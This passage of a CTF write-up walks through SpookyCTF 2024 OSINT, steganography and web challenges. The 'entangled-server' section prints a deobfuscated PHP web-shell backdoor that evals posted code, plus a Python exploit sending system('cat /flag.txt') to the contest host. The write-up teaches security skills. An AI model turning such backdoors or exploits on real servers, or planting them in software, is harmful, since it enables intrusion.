        data-srcset="%7b9ADA5CD5-4798-4421-81BD-EB1075AFD504%7d.png, %7b9ADA5CD5-4798-4421-81BD-EB1075AFD504%7d.png 1.5x, %7b9ADA5CD5-4798-4421-81BD-EB1075AFD504%7d.png 2x"
        data-sizes="auto"
        alt="{9ADA5CD5-4798-4421-81BD-EB1075AFD504}.png"
        title="alt text" /></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="%7b6525CFE0-8DA7-4D99-A619-B0E464D172A7%7d.png"
        data-srcset="%7b6525CFE0-8DA7-4D99-A619-B0E464D172A7%7d.png, %7b6525CFE0-8DA7-4D99-A619-B0E464D172A7%7d.png 1.5x, %7b6525CFE0-8DA7-4D99-A619-B0E464D172A7%7d.png 2x"
        data-sizes="auto"
        alt="{6525CFE0-8DA7-4D99-A619-B0E464D172A7}.png"
        title="alt text" /></p>
<p>Look up their facebook page and there you&rsquo;ll find a pic of Ethan Hawke :</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="%7b967D36EC-42DC-4ECA-94C1-8F3A7E84232D%7d.png"
        data-srcset="%7b967D36EC-42DC-4ECA-94C1-8F3A7E84232D%7d.png, %7b967D36EC-42DC-4ECA-94C1-8F3A7E84232D%7d.png 1.5x, %7b967D36EC-42DC-4ECA-94C1-8F3A7E84232D%7d.png 2x"
        data-sizes="auto"
        alt="{967D36EC-42DC-4ECA-94C1-8F3A7E84232D}.png"
        title="alt text" /></p>
<p>So to save time I just googled Ethan Hawke upcoming movie, he&rsquo;s playing The Grabber.</p>
<hr>
<h2 id="perfect-nba-fit---osint">perfect-nba-fit - Osint</h2>
<h3 id="description-7">Description</h3>
<p>NJIT has a pretty good basketball team, but we could use some taller players to give us a big step in the right direction. We heard there was a creature in NJ who is a perfect fit, but we&rsquo;ve got to find where they are. We heard they were last seen about 5 - 7 years ago, but can&rsquo;t remember the specifics - just that it was here in NJ and within a couple of hours of the school. Most of us commute anyway, so what&rsquo;s an hour or so to help our Highlanders get the edge?</p>
<p>Can you find where they were last seen? We need to be as specific as possible- anything less than a Class A sighting in NJ will not do. Get the exact day of the month, the approximate time using the 24 hour format, nearest road number and nearest town.</p>
<p>NICC{DayOfTheMonth_HH:MM_Road-Name_Town-Name}</p>
<p>Example: NICC{10_20:30_Interstate-280_Newark}</p>
<h3 id="explanation-7">Explanation</h3>
<p>Big step is a keyword, the perfect fit is no other than Big Foot himself.
I searched Big foot sightings on Google and found this <a href="https://www.bfro.net/gdb/" target="_blank" rel="noopener noreffer ">site</a>. Found a Class A sighting in New Jersey and gave the report to GPT to pretty much extract what I wanted cause I&rsquo;m too lazy to read :)</p>
<hr>
<h2 id="they-have-returned---osint">they-have-returned - Osint</h2>
<h3 id="description-8">Description</h3>
<p>Some user has came back nearly a year and a half after no known online activites to wreck havoc across the timeline. Their activity seems to suggest an attack is coming soon!</p>
<h2 id="hint-1">Hint</h2>
<p>Navigate to the arrivals channel for possible leads to the suspected user.</p>
<h3 id="explanation-8">Explanation</h3>
<p>A bit guessy, but to solve it you had to figure out that they&rsquo;re referencing the Terminator&rsquo;s famous quote : &ldquo;I&rsquo;ll be back&rdquo;.</p>
<p>Anyway there&rsquo;s someone on the discord that has Arnold as their avatar, Check their profil you&rsquo;ll find their Twitter from there you can get the flag.</p>
<hr>
<h2 id="photo-clue---steganography">photo-clue - Steganography</h2>
<h3 id="description-9">Description</h3>
<p>A seemingly innocuous old photo file has emerged, but Mary Morse suspects it may hold the key to deciphering The Consortium&rsquo;s next move. Your task is to analyze the metadata, uncover the true nature of the file, and submit the flag before The Consortium acts. Time is running out—can you crack the mystery behind the photo?</p>
<p>(Note: If you choose to use volatility2.6, use profile Win10x64_19041)</p>
<h3 id="explanation-9">Explanation</h3>
<p>Run volatility on the raw file, list all files and you&rsquo;ll find an Image called REDACTED, extract it, run steghide on it, and you&rsquo;ll find a pdf file inside.</p>
<p>the file is password protected, the password was spooky2024 (You can either guess it or bruteforce it using rockyou.txt).</p>
<hr>
<h2 id="set-your-intentions-right---steganography">set-your-intentions-right - Steganography</h2>
<h3 id="description-10">Description</h3>
<p>Mary and Maya wanted to spend the rest of their Friday evening having more fun. They decided to go raundonauting, they set their intentions to paranormal and it sounds like they needed to end up hiding from what they found.</p>
<h3 id="explanation-10">Explanation</h3>
<p>Another easy one, just look at the spectrogram of the audio.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="image.png"
        data-srcset="image.png, image.png 1.5x, image.png 2x"
        data-sizes="auto"
        alt="image.png"
        title="alt text" /></p>
<hr>
<h2 id="whispers-in-morse---steganography">whispers-in-morse - Steganography</h2>
<h3 id="description-11">Description</h3>
<p>Mary got a letter from Maya talking about seeing a cryptid sighting but doesn&rsquo;t want other people to know, the only thing attached is this picture? She wonders if there could be a secret message hidden inside.</p>
<h3 id="explanation-11">Explanation</h3>
<p>Check the strings, last line is &ldquo;Password: M.A.__.R.Y&rdquo;, use steghide to get the flag.txt file.</p>
<hr>
<h2 id="entangled-server---web">entangled-server - Web</h2>
<h3 id="description-12">Description</h3>
<p>A NICC agent found an old abandoned server with some very suspicious files on it. We have found the file it was hosting on a webserver but it seems like it was very heavily obfuscated. Can you figure out how to get in?</p>
<p>The flag is located at /flag.txt on the server.</p>
<h3 id="explanation-12">Explanation</h3>
<p>You&rsquo;ll have to deobfuscate the code line by line, it&rsquo;s more of a reverse challenge than a web one.</p>
<p>You&rsquo;ll end up with this code :</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Disable error output and execution time limits
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;error_log&#34;</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;log_errors&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;max_execution_time&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Set the authentication flag
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$flag</span> <span class="o">=</span> <span class="s2">&#34;5p1n-th3-51lly-5tr1ng5&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// XOR function for encoding and decoding
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">function</span> <span class="nf">xorEncrypt</span><span class="p">(</span><span class="nv">$input</span><span class="p">,</span> <span class="nv">$key</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$output</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$keyLength</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$input</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">,</span> <span class="nv">$j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$j</span> <span class="o">==</span> <span class="nv">$keyLength</span><span class="p">)</span> <span class="nv">$j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// Repeat the key if it&#39;s shorter than input
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$output</span> <span class="o">.=</span> <span class="nx">chr</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$input</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">^</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$key</span><span class="p">[</span><span class="nv">$j</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$output</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Decode function that uses the flag as a key for XOR
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">function</span> <span class="nf">doubleXorDecode</span><span class="p">(</span><span class="nv">$input</span><span class="p">,</span> <span class="nv">$key</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">xorEncrypt</span><span class="p">(</span><span class="nx">xorEncrypt</span><span class="p">(</span><span class="nv">$input</span><span class="p">,</span> <span class="nv">$flag</span><span class="p">),</span> <span class="nv">$key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Initialize input variables from $_POST
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$encodedPayload</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$postKey</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$encodedPayload</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$_POST</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$encodedPayload</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$postKey</span> <span class="o">=</span> <span class="nv">$key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Decode and check the input
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nv">$encodedPayload</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$decodedInput</span> <span class="o">=</span> <span class="nx">json_decode</span><span class="p">(</span><span class="nx">doubleXorDecode</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$encodedPayload</span><span class="p">),</span> <span class="nv">$postKey</span><span class="p">),</span> <span class="k">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$decodedInput</span><span class="p">[</span><span class="s2">&#34;ak&#34;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$decodedInput</span><span class="p">[</span><span class="s2">&#34;ak&#34;</span><span class="p">]</span> <span class="o">===</span> <span class="nv">$flag</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$decodedInput</span><span class="p">[</span><span class="s2">&#34;a&#34;</span><span class="p">]</span> <span class="o">===</span> <span class="s2">&#34;e&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">eval</span><span class="p">(</span><span class="nv">$decodedInput</span><span class="p">[</span><span class="s2">&#34;d&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">exit</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>There&rsquo;s an eval at the code, meaning we can manage to execute cat /flag.txt. BUT, there&rsquo;s the xor function, but we all know how xor works, it&rsquo;s reversible.</p>
<p>output = &ldquo;5p1n-th3-51lly-5tr1ng5&rdquo; xor (input xor key) [!we can choose key and input, remember that!]
if key = 0 :
output = &ldquo;5p1n-th3-51lly-5tr1ng5&rdquo; xor input xor &ldquo;5p1n-th3-51lly-5tr1ng5&rdquo;</p>
<p>output now matches input.</p>
<p>Now it&rsquo;s simpler. All we need to do is : Create a payload that contains &ldquo;ak&rdquo;,&ldquo;a&rdquo; and &ldquo;d&rdquo;, the payload must be base64 encoded THEN xored with &ldquo;5p1n-th3-51lly-5tr1ng5&rdquo; which is our key.</p>
<h3 id="script">Script</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;ak&#34;</span><span class="p">:</span> <span class="s2">&#34;5p1n-th3-51lly-5tr1ng5&#34;</span><span class="p">,</span>    
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;a&#34;</span><span class="p">:</span> <span class="s2">&#34;e&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;d&#34;</span><span class="p">:</span> <span class="s2">&#34;system(&#39;cat /flag.txt&#39;);&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="s2">&#34;5p1n-th3-51lly-5tr1ng5=&#34;</span><span class="o">+</span><span class="n">payload</span>
</span></span><span class="line"><span class="cl"><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;Application/X-WWW-FORM-URLENCODED&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&#34;http://entangled-server.niccgetsspooky.xyz:1337/&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span></code></pre></div><hr>
<h2 id="future-plans---web">Future Plans - Web</h2>
<h3 id="description-13">Description</h3>
<p>That mysterious G0ldenFalc0ln7 is up to something. He&rsquo;s been pretty hard to tie down in the past, but Anna found a blog of his. It looks like he&rsquo;s gotten around to planning something big.</p>
<p>We still don&rsquo;t know whether he&rsquo;s good, bad, or just a little bit of both. For all we know, he could be one of our own.</p>
<p>With everyone so distracted by the annual release of cryptids and creepy crawlies, he seems to be leveraging the chaos to his advantage to communicate with his faction &ndash; whoever that is.</p>
<p>Find out what he&rsquo;s got planned if you can - we need to know what we&rsquo;re up against before the spring!</p>
<p><a href="https://www.niccgetsspooky.xyz" target="_blank" rel="noopener noreffer ">https://www.niccgetsspooky.xyz</a></p>
<h3 id="hint1">Hint#1</h3>
<p>If you think about it, I think you&rsquo;ll get it.</p>
<h3 id="hint2">Hint#2</h3>
<ul>
<li>If you want the flag:
<ul>
<li>You can read the description</li>
<li>You can read the website</li>
<li>You can get the flag</li>
</ul>
</li>
<li>If you want the ban:
<ul>
<li>You can run a fuzzer or dirbuster</li>
</ul>
</li>
</ul>
<h3 id="explanation-13">Explanation</h3>
<p>This one&rsquo;s good, really clever. If you read the blog you&rsquo;ll find this :
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="%7bF3B32427-36D0-4071-BED7-9247921D941B%7d.png"
        data-srcset="%7bF3B32427-36D0-4071-BED7-9247921D941B%7d.png, %7bF3B32427-36D0-4071-BED7-9247921D941B%7d.png 1.5x, %7bF3B32427-36D0-4071-BED7-9247921D941B%7d.png 2x"
        data-sizes="auto"
        alt="{F3B32427-36D0-4071-BED7-9247921D941B}.png"
        title="alt text" /></p>
<p>The challenge revolves around Time, the future, time travel, the abductions, 1973, Ray guns, the borealis, Hyperborea&hellip;🎵 Alien, magical, flyin&rsquo;, and all. 🎵</p>
<p>Right, just add the following header to your request :</p>
<p><code>If-Modified-Since: Fri, 18 Apr 2025 15:14:19 GMT</code></p>
<p>Nothing happens unless you head to plans, that&rsquo;s where you&rsquo;ll find your future flag. Congratulations, you have invented time travel.</p>
<hr>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2024-10-30</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"><span>
                            <a class="link-to-markdown" href="/spookyctf-2024-full-writeup/index.md" target="_blank">Read Markdown</a>
                        </span></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://thesaucese.github.io/spookyctf-2024-full-writeup/" data-title="SpookyCTF 2024 - Full Writeup" data-hashtags="FORENSICS,OSINT,STEGANO,MISC,WEB,SPOOKYCTF,REVERSE,2024"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://thesaucese.github.io/spookyctf-2024-full-writeup/" data-hashtag="FORENSICS"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://thesaucese.github.io/spookyctf-2024-full-writeup/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/forensics/">FORENSICS</a>,&nbsp;<a href="/tags/osint/">OSINT</a>,&nbsp;<a href="/tags/stegano/">STEGANO</a>,&nbsp;<a href="/tags/misc/">MISC</a>,&nbsp;<a href="/tags/web/">WEB</a>,&nbsp;<a href="/tags/spookyctf/">SPOOKYCTF</a>,&nbsp;<a href="/tags/reverse/">REVERSE</a>,&nbsp;<a href="/tags/2024/">2024</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/easy-license/" class="prev" rel="prev" title="Cyber Odyssey 2024 - easy license"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Cyber Odyssey 2024 - easy license</a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.132.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/index.umd.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"data":{"id-1":"TheSaucese","id-2":"TheSaucese"},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
